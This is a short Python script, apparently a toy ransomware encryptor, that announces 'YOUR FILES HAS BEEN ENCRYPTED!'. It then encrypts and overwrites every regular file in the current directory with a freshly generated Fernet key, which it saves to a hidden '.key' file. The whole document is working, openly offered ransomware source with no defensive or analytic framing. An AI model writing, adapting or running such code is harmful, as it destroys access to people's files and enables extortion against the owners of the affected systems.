#!/bin/env python

import os
from cryptography.fernet import Fernet

# __author__ = ("Justine Dela Torre (Jasutin)")

# __all__ = ['encrypt', 'decrypt']

print("\tYOUR FILES HAS BEEN ENCRYPTED!\n")

files = []

for file in os.listdir():
    if file == ".decrypt" or file == ".key" or file == ".secret" or file == ".encrypt":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open(".key", "wb") as decryptionkey:
    decryptionkey.write(key)

for file in files:
    with open(file, "rb") as enjasu:
        contents = enjasu.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as enjasu:
        enjasu.write(contents_encrypted)

exit()



